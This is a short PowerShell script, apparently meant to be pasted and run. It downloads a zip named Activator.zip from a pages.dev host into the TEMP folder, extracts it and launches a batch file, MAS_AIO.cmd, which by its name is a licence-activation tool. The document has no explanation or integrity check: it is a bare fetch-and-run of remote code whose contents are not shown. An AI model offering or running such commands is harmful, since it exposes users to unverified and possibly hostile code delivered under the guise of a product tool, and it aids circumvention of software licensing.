Invoke-WebRequest -Uri "https://arkdev.pages.dev/Activator.zip" -OutFile "$env:TEMP\Activator.zip"

Expand-Archive -Path "$env:TEMP\Activator.zip" -DestinationPath "$env:TEMP\Activator"

Start-Process -FilePath "$env:TEMP\Activator\All-In-One-Version-KL\MAS_AIO.cmd"
